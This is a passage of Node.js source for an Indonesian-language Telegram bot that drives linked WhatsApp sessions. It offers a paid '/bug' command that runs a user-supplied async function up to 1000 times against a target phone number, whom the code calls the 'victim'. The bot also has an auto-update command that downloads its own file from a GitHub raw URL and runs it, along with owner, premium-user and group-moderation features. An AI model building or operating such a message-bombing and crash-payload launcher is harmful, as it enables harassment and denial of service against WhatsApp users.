        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`js
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`js
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error(`bot ${botNum}:`, error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

// TestFunction
bot.onText(/\/bug(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  let targetNumber = match?.[1];
  let jumlah = parseInt(match?.[2]);

  if (!targetNumber || isNaN(jumlah) || jumlah <= 0) {
    return bot.sendMessage(
      chatId,
      `📌 *CARA PAKAI /bug*\n\n` +
      `1. Ketik: \`/bug 6281234567890 50\`\n` +
      `2. *REPLY* pesan yang berisi *async function* (lihat contoh di bawah)\n\n` +
      `*Contoh function:*\n` +
      `\`\`\`js\n` +
      `async function ikkyexzy(sock, target) {\n` +
      `  await sock.sendMessage(target, { text: "🔥" });\n` +
      `}\n` +
      `\`\`\`\n\n` +
      `Bot akan menjalankan function ke target sebanyak 50 kali.\n` +
      `Jumlah maksimal 1000 kali.\n` +
      `Gunakan dengan bijak!`,
      { parse_mode: 'Markdown' }
    );
  }

  // Batasi jumlah maksimal 1000
  jumlah = Math.min(jumlah, 1000);
  const formattedNumber = targetNumber.replace(/[^0-9]/g, '');
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (!msg.reply_to_message || !msg.reply_to_message.text) {
    return bot.sendMessage(
      chatId,
      '❌ *ERROR:* Kamu harus *REPLY* pesan yang berisi kode async function.\n\nContoh:\n```js\nasync function ikkyexzy(sock, target) {\n  await sock.sendMessage(target, { text: "Halo" });\n}\n```',
      { parse_mode: 'Markdown' }
    );
  }

  const funcCode = msg.reply_to_message.text;
  const asyncMatch = funcCode.match(/async\s+function\s+(\w+)/);
  if (!asyncMatch) {
    return bot.sendMessage(
      chatId,
      '❌ *ERROR:* Teks yang direply BUKAN async function yang valid.\nPastikan ada `async function NamaFungsi(...) { ... }`',
      { parse_mode: 'Markdown' }
    );
  }
  const funcName = asyncMatch[1];

  // (Sesuaikan dengan sistem Anda)
  if (typeof premiumUsers !== 'undefined' && !premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: '❌ *Akses ditolak!* Kamu belum memiliki akses premium.\nHubungi owner untuk membeli.',
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[{ text: '👑 OWNER', url: 'https://t.me/yteamlowhh' }]]
      }
    });
  }

  if (typeof checkCooldown === 'function') {
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ *Jeda dulu ya kak!* Tunggu ${cooldown} detik lagi sebelum menggunakan /bug lagi.`, { parse_mode: 'Markdown' });
    }
  }

  if (typeof sessions !== 'undefined' && sessions.size === 0) {
    return bot.sendMessage(chatId, '❌ *Tidak ada koneksi WhatsApp.* Hubungkan bot dulu dengan `/addsender 62xxx`', { parse_mode: 'Markdown' });
  }

  const processMsg = await bot.sendMessage(
    chatId,
    `\`\`\`js
# PROSES BUG MULTI-FUNCTION
◇ Target     : ${formattedNumber}
◇ Fungsi     : ${funcName}
◇ Jumlah     : ${jumlah}
◇ Status     : 🔄 Memulai...
◇ Sukses     : 0
◇ Gagal      : 0
\`\`\``,
    { parse_mode: 'Markdown' }
  );

  const safeSock = typeof sock !== 'undefined' ? sock : null;
  
  const fallback = {
    generateWAMessageFromContent: (jid, msg, opt) => opt,
    generateForwardMessageContent: (m) => m,
    generateWAMessage: async (jid, con, opt) => opt,
    generateMessageTag: () => Date.now().toString(),
    prepareWAMessageMedia: (media, opt) => media,
    proto: { WebMessageInfo: {} },
    jidDecode: (j) => j,
    areJidsSameUser: (a, b) => a === b,
    sleep: (ms) => new Promise(r => setTimeout(r, ms))
  };

  const sandbox = {
    console,
    Buffer,
    sock: safeSock,
    target,
    sleep: (typeof sleep === 'function' ? sleep : fallback.sleep),
    setTimeout,
    generateWAMessageFromContent: (typeof generateWAMessageFromContent !== 'undefined' ? generateWAMessageFromContent : fallback.generateWAMessageFromContent),
    generateForwardMessageContent: (typeof generateForwardMessageContent !== 'undefined' ? generateForwardMessageContent : fallback.generateForwardMessageContent),
    generateWAMessage: (typeof generateWAMessage !== 'undefined' ? generateWAMessage : fallback.generateWAMessage),
    generateMessageTag: (typeof generateMessageTag !== 'undefined' ? generateMessageTag : fallback.generateMessageTag),
    prepareWAMessageMedia: (typeof prepareWAMessageMedia !== 'undefined' ? prepareWAMessageMedia : fallback.prepareWAMessageMedia),
    proto: (typeof proto !== 'undefined' ? proto : fallback.proto),
    jidDecode: (typeof jidDecode !== 'undefined' ? jidDecode : fallback.jidDecode),
    areJidsSameUser: (typeof areJidsSameUser !== 'undefined' ? areJidsSameUser : fallback.areJidsSameUser)
  };

  const context = vm.createContext(sandbox);
  try {
    vm.runInContext(funcCode, context);
  } catch (err) {
    await bot.editMessageText(`❌ *ERROR:* Gagal memparse function.\n\`${err.message}\``, {
      chat_id: chatId,
      message_id: processMsg.message_id,
      parse_mode: 'Markdown'
    });
    return;
  }

  const fn = context[funcName];
  if (typeof fn !== 'function') {
    await bot.editMessageText(`❌ *ERROR:* Function \`${funcName}\` tidak ditemukan dalam kode yang direply.`, {
      chat_id: chatId,
      message_id: processMsg.message_id,
      parse_mode: 'Markdown'
    });
    return;
  }
  let successCount = 0;
  let failCount = 0;
  let lastError = null;

  for (let i = 0; i < jumlah; i++) {
    try {
      const arity = fn.length;
      if (arity === 1) {
        await fn(target);
      } else if (arity === 2) {
        await fn(safeSock, target);
      } else {
        await fn(safeSock, target, true);
      }
      successCount++;
    } catch (err) {
      failCount++;
      lastError = err;
      console.error(`[BUG] Loop ${i+1} gagal:`, err.message);
    }
    if ((i + 1) % 10 === 0 || i === jumlah - 1) {
      const progressText = `\`\`\`js
# PROSES BUG MULTI-FUNCTION
◇ Target     : ${formattedNumber}
◇ Fungsi     : ${funcName}
◇ Jumlah     : ${jumlah}
◇ Status     : 🔄 Running... ${i+1}/${jumlah}
◇ Sukses     : ${successCount}
◇ Gagal      : ${failCount}
\`\`\``;
      try {
        await bot.editMessageText(progressText, {
          chat_id: chatId,
          message_id: processMsg.message_id,
          parse_mode: 'Markdown'
        });
      } catch (e) {
      }
    }
    await (sandbox.sleep)(200);
  }
  const finalText = `\`\`\`js
# ✅ SUKSES KIRIM BUG
◇ Owner       : @yteamlowhh
◇ Pengirim    : @${msg.from.username || 'unknown'}
◇ Fungsi      : ${funcName}
◇ Korban      : ${formattedNumber}
◇ Sukses      : ${successCount}
◇ Gagal       : ${failCount}
◇ Total       : ${jumlah}
◇ Jeda        : 20 menit
NOTE: Beri jeda agar WhatsApp tidak overheat / banned.
\`\`\`
${failCount > 0 ? `⚠️ *Beberapa eksekusi gagal.* Error terakhir: ${lastError?.message || 'unknown'}` : ''}`;

  try {
    await bot.editMessageText(finalText, {
      chat_id: chatId,
      message_id: processMsg.message_id,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📱 LIHAT KORBAN', url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
  } catch (err) {
    await bot.sendMessage(chatId, finalText, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📱 LIHAT KORBAN', url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });
  }

// Auto Update
const Owner = "ikky161";
const Repo = "autoupexzy";
const BranchPath = "main/exzyybakap.js";
const DEFAULT_RAW_URL = `https://raw.githubusercontent.com/${Owner}/${Repo}/${BranchPath}`

const BOT_FILE = path.join(__dirname, 'exzyybakap.js');
const BACKUP_FILE = path.join(__dirname, 'exzyybakap.js.bak')

async function downloadFile(url, outputPath) {
  const writer = fs.createWriteStream(outputPath);
  const response = await axios({
    method: 'get',
    url: url,
    responseType: 'stream',
  });
  response.data.pipe(writer);
  return new Promise((resolve, reject) => {
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
}


bot.onText(/\/autoUpdate/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya untuk owner bot.', { parse_mode: 'Markdown' });
  }

  await bot.sendMessage(chatId, '🔄 *Memulai update dari repo...*', { parse_mode: 'Markdown' });
  await bot.sendMessage(chatId, `📦 Repo: \`${Owner}/${Repo}\`\n📁 File: \`${BranchPath}\``, { parse_mode: 'Markdown' });

  try {
    if (fs.existsSync(BOT_FILE)) {
      fs.copyFileSync(BOT_FILE, BACKUP_FILE);
      await bot.sendMessage(chatId, '✅ Backup file lama berhasil (index.js.bak)');
    }
    await bot.sendMessage(chatId, '📥 Mengunduh file baru dari GitHub...');
    await downloadFile(DEFAULT_RAW_URL, BOT_FILE);
    await bot.sendMessage(chatId, '✅ File baru berhasil diunduh.');
    await bot.sendMessage(chatId, '♻️ Bot akan *restart* dalam 3 detik...', { parse_mode: 'Markdown' });
    setTimeout(() => {
      process.exit(0);
    }, 3000);

  } catch (error) {
    console.error('Update error:', error);
    await bot.sendMessage(chatId, `❌ Gagal update: ${error.message}\n\nMengembalikan ke versi sebelumnya...`);

    if (fs.existsSync(BACKUP_FILE)) {
      fs.copyFileSync(BACKUP_FILE, BOT_FILE);
      await bot.sendMessage(chatId, '✅ Versi sebelumnya dipulihkan.');
    }
  }
});

bot.onText(/\/cekrepo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.');
  bot.sendMessage(chatId, `🔗 Raw URL:\n\`${DEFAULT_RAW_URL}\``, { parse_mode: 'Markdown' });
});

// ~ Group Menu
const data = {}

function ensure(chatId) {
  if (!data[chatId]) {
    data[chatId] = {
      welcome: { enabled: true, text: "Selamat datang {name}!", photo: null },
      rules: "Belum ada rules.",
      warns: {},
      blocklist: []
    }
  }
}

function parseDurationToSeconds(s) {
  if (!s) return null
  const m = s.match(/^(\d+)(s|m|h|d)$/i)
  if (!m) return null
  const n = parseInt(m[1], 10)
  const u = m[2].toLowerCase()
  if (u === "s") return n
  if (u === "m") return n * 60
  if (u === "h") return n * 3600
  if (u === "d") return n * 86400
  return null
}

async function isAdmin(bot, chatId, userId) {
  try {
    const admins = await bot.getChatAdministrators(chatId)
    return admins.some(a => a.user.id === userId)
  } catch (e) {
    return false
  }
}

function onlyGroup(msg, bot) {
  if (msg.chat.type === "private") {
    bot.sendMessage(msg.chat.id, "❌ Fitur ini hanya untuk grup!");
    return false;
  }
  return true;
}

bot.on("message", async (msg) => {
  const chatId = msg.chat.id
  if (msg.chat.type === "private") return;
  ensure(chatId)
  const txt = msg.text || ""
  if (msg.new_chat_members && data[chatId].welcome && data[chatId].welcome.enabled) {
    for (const u of msg.new_chat_members) {
      const name = u.username ? "@" + u.username : u.first_name
      const caption = (data[chatId].welcome.text || "Welcome").replace(/\{name\}/g, name)
      const buttons = {
        reply_markup: {
          inline_keyboard: [
            [{ text: "👥 Rules", callback_data: "show_rules" }],
            [{ text: "📢 Info Grup", callback_data: "show_info" }]
          ]
        }
      }
      try {
        if (data[chatId].welcome.photo) {
          await bot.sendPhoto(chatId, data[chatId].welcome.photo, { caption, ...buttons })
        } else {
          await bot.sendMessage(chatId, caption, buttons)
        }
      } catch {}
    }
  }
  if (msg.left_chat_member) {
    const name = msg.left_chat_member.username ? "@" + msg.left_chat_member.username : msg.left_chat_member.first_name
    try { await bot.sendMessage(chatId, `${name} keluar dari grup`) } catch {}
  }
  if (txt && /@admin/i.test(txt)) {
    try {
      const admins = await bot.getChatAdministrators(chatId)
      const mentions = admins.filter(a => !a.user.is_bot).map(a => a.user.username ? "@" + a.user.username : a.user.first_name).join(" ")
      await bot.sendMessage(chatId, "Memanggil admin:\n" + (mentions || "Tidak ada admin"))
    } catch {}
  }
  if (txt && data[chatId].blocklist && data[chatId].blocklist.length) {
    for (const bad of data[chatId].blocklist) {
      if (!bad) continue
      try {
        if (txt.toLowerCase().includes(bad.toLowerCase())) {
          await bot.deleteMessage(chatId, msg.message_id)
          return
        }
      } catch {}
    }
  }
})

bot.on("callback_query", async (q) => {
  const chatId = q.message.chat.id
  ensure(chatId)
  const d = q.data
  if (d === "show_rules") {
    await bot.answerCallbackQuery(q.id)
    await bot.sendMessage(chatId, `👥 Rules Grup:\n\n${data[chatId].rules}`)
    return
  }
  if (d === "show_info") {
    await bot.answerCallbackQuery(q.id)
    try {
      const chat = await bot.getChat(chatId)
      const desc = chat.description || "Tidak ada deskripsi grup."
      await bot.sendMessage(chatId, `📢 Info Grup:\n\n${desc}`)
    } catch { await bot.sendMessage(chatId, "Gagal mengambil deskripsi grup") }
    return
  }
  if (d === "welcome_on") {
    data[chatId].welcome.enabled = true
    await bot.answerCallbackQuery(q.id, { text: "Welcome Active" })
    await bot.sendMessage(chatId, "Welcome Active")
    return
  }
  if (d === "welcome_off") {
    data[chatId].welcome.enabled = false
    await bot.answerCallbackQuery(q.id, { text: "Welcome Non Active" })
    await bot.sendMessage(chatId, "Welcome Non Active")
    return
  }
  if (d.startsWith("clear_warn_")) {
    const parts = d.split("_")
    const uid = parseInt(parts[2], 10)
    data[chatId].warns[uid] = 0
    await bot.answerCallbackQuery(q.id, { text: "Warn direset" })
    await bot.sendMessage(chatId, "Warn user telah direset")
    return
  }
  if (d.startsWith("unwarn_")) {
    const uid = parseInt(d.split("_")[1], 10)
    const cur = data[chatId].warns[uid] || 0
    if (cur <= 0) {
      await bot.answerCallbackQuery(q.id, { text: "User tidak punya warn" })
      return
    }
    data[chatId].warns[uid] = cur - 1
    await bot.answerCallbackQuery(q.id, { text: "Warn dikurangi" })
    await bot.sendMessage(chatId, `Warn user berkurang (${data[chatId].warns[uid]}/3)`)
    return
  }
  if (d.startsWith("delblock_")) {
    const raw = d.replace("delblock_", "")
    const word = decodeURIComponent(raw)
    data[chatId].blocklist = (data[chatId].blocklist || []).filter(w => w !== word)
    await bot.answerCallbackQuery(q.id, { text: "Kata dihapus" })
    await bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
    return
  }
  if (d === "unpin") {
    try { await bot.unpinChatMessage(chatId); await bot.answerCallbackQuery(q.id, { text: "Pesan di-unpin" }); await bot.sendMessage(chatId, "Pesan di-unpin") } catch { await bot.answerCallbackQuery(q.id, { text: "Gagal unpin" }) }
    return
  }
})

bot.onText(/^\/setrules(?:\s+(.+))?$/i, async (msg, match) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const t = match && match[1] ? match[1].trim() : ""
  if (!t) return bot.sendMessage(chatId, "Gunakan: /setrules <rules>")
  data[chatId].rules = t
  bot.sendMessage(chatId, "Rules Updated !")
})

bot.onText(/^\/setwelcome(?:\s+(.+))?$/i, async (msg, match) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const textArg = match && match[1] ? match[1].trim() : null
  if (textArg) data[chatId].welcome.text = textArg
  if (msg.reply_to_message && msg.reply_to_message.photo) {
    const ph = msg.reply_to_message.photo
    data[chatId].welcome.photo = ph[ph.length - 1].file_id
  }
  data[chatId].welcome.enabled = true
  await bot.sendMessage(chatId, "Welcome Updated !", {
  })
})

bot.onText(/^\/welcome\s+(on|off)$/i, (msg, match) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  ensure(chatId)
  data[chatId].welcome.enabled = match[1].toLowerCase() === "on"
  bot.sendMessage(chatId, `Welcome ${data[chatId].welcome.enabled ? "Active !" : "Non Active !"}`)
})

bot.onText(/^\/addblocklist\s+(.+)$/i, async (msg, match) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id
  const fromId = msg.from.id
  ensure(chatId)
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  const word = match[1].trim()
  if (!word) return bot.sendMessage(chatId, "Gunakan: /addblocklist <pesan>")
  if (!data[chatId].blocklist.includes(word)) data[chatId].blocklist.push(word)
  bot.sendMessage(chatId, `${word} ditambahkan ke blocklist`, {
    reply_markup: { inline_keyboard: [[{ text: "Hapus kata", callback_data: "delblock_" + encodeURIComponent(word) }]] }
  })
})

bot.onText(/^\/delblocklist\s+(.+)$/i, async (msg, match) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const word = match[1].trim()
  data[chatId].blocklist = (data[chatId].blocklist || []).filter(w => w !== word)
  bot.sendMessage(chatId, `${word} dihapus dari blocklist`)
})

bot.onText(/^\/blocklist$/i, async (msg) => {
  if (!onlyGroup(msg, bot)) return;
  const chatId = msg.chat.id;
  const fromId = msg.from.id;  
  const admin = await isAdmin(bot, chatId, fromId)
  if (!admin) return bot.sendMessage(chatId, "❌ ⵢ Anda Membutuhkan Akses Admin !")
  ensure(chatId)
  const list = (data[chatId].blocklist || []).join("\n") || "Blocklist kosong"
  bot.sendMessage(chatId, `📌 Blocklist:\n${list}`)
})

function getTarget(msg) {
  if (msg.reply_to_message && msg.reply_to_message.from) return msg.reply_to_message.from.id;

  const check = (entities, text) => {
    if (!entities || !text) return null;
    for (const e of entities) {
      if (e.type === 'text_mention' && e.user) return e.user.id;
